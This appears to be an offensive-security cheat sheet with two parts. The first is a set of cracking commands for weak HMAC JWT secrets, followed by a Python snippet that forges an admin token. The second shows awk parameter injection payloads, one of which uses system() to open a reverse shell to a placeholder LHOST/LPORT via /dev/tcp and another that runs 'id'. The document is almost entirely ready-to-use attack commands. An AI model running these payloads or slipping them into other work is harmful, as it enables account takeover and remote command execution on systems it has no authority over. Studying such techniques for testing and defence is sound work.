# JWT Secret Brute Force + awk Parameter Injection

## JWT Secret Brute Force

When a JWT uses HMAC (HS256/HS384/HS512) and the secret is weak:
```bash
# hashcat
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt

# jwt-tool
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# john
echo "<JWT_TOKEN>" > jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt --format=HMAC-SHA256
```

Once you have the secret, forge a new token with elevated claims:
```bash
jwt_tool <TOKEN> -T  # modify claims interactively
# OR:
python3 -c "
import jwt, json
secret = 'found_secret'
payload = {'user': 'admin', 'role': 'admin', 'iat': 9999999999}
print(jwt.encode(payload, secret, algorithm='HS256'))
"
```

## awk Parameter Injection

If user input flows into an `awk` command as a field separator or pattern:
```bash
# Vulnerable shell call:
awk -F"${USER_INPUT}" '{print $1}' file.txt
# Or: awk "/${USER_INPUT}/" file.txt

# Inject awk's system() via pattern:
# User input: /' {system("bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'")}; /
awk '/'"'"' {system("bash -c '\''bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\''")}; /' file.txt

# Simpler: inject via BEGIN block
# Input value: } BEGIN{system("id")} {
```
